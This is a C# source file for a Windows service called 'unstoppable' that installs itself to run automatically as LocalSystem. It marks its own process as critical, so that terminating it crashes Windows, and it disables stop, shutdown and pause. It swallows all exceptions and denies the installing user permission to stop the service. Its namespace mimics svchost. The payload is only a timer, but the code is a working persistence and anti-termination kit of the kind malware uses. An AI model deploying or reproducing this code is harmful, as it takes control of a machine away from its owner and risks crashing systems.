using System;
using System.Configuration.Install;
using System.Reflection;
using System.ServiceProcess;
using System.ComponentModel;
using System.Timers;
using svchost.Resilience;
using svchost.Resilience.DllImports;

namespace unstoppable
{
    class Program : ServiceBase
    {
        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += CurrentDomainUnhandledException;
            if (Environment.UserInteractive)
            {
                //if run interactively, just try to uninstall/reinstall any previous versions of the service
                try
                {
                    ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
                }
                catch { }
                ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
            }
            else
            {
                //we are running in the service context, so start the service
                Run(new Program());
            }
        }

        private static void CurrentDomainUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            //Eat this exception
            //((Exception)e.ExceptionObject).Message + ((Exception)e.ExceptionObject).InnerException.Message);
        }

        private void DoNotStopTheRock()
        {
            /*
            
            ====       ====
              ==\\    //==
                 \\/\//
                  *  *

            */
            ///Stopping this process without 1st marking it as no longer critical will BSOD Windows.
            CriticalProcess.MarkAs(true);
            CanStop = false;
            CanShutdown = false;
            CanPauseAndContinue = false;
            CanHandlePowerEvent = false;
        }

        public Program()
        {
            ServiceName = "unstoppable";
            DoNotStopTheRock();
        }

        protected override void OnStart(string[] args)
        {
            Console.WriteLine("Service Started.");
            var timer = new Timer();
            timer.Interval = 30000; //30 seconds
            timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            timer.Enabled = true;
            base.OnStart(args);
        }

        private void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            Console.WriteLine("Timer Fired");
        }

        protected override void OnStop()
        {
            CriticalProcess.MarkAs(false);
            base.OnStop();
        }
    }

    [RunInstaller(true)]
    public class MyWindowsServiceInstaller : Installer
    {
        public MyWindowsServiceInstaller()
        {
            var processInstaller = new ServiceProcessInstaller();
            var serviceInstaller = new ServiceInstaller();
            serviceInstaller.DisplayName = "Windows Unstoppable Service";
            serviceInstaller.Description = "Provides an unstoppable Windows Service Experience. Lorem Ipsum Dolor.";
            serviceInstaller.ServiceName = "unstoppable";
            serviceInstaller.StartType = ServiceStartMode.Automatic;
            processInstaller.Account = ServiceAccount.LocalSystem;
            Installers.Add(processInstaller);
            Installers.Add(serviceInstaller);
            serviceInstaller.AfterInstall += ServiceInstaller_AfterInstall;
        }

        void ServiceInstaller_AfterInstall(object sender, InstallEventArgs e)
        {
            foreach (var svc in ServiceController.GetServices())
            {
                if (svc.ServiceName == "unstoppable")
                {
                    Console.WriteLine("[*] Found service installed: {0}", svc.DisplayName);

                    Console.WriteLine("[*] Removing service stop permissions for the current user...");

                    //A SERVICE_ACCESS mask of AdvApi32.SERVICE_ACCESS.SERVICE_ALL_ACCESS would prevent the current user from interacting with the service completely

                    RestrictControl.ServiceControlPermissions(svc.ServiceName,
                        RestrictControl.GetCurrentAccountSid(),
                        System.Security.AccessControl.AccessControlType.Deny,
                        AdvApi32.SERVICE_ACCESS.SERVICE_STOP);

                    Console.WriteLine("[*] Starting service ...");
                    svc.Start();
                }
            }
        }
    }
}
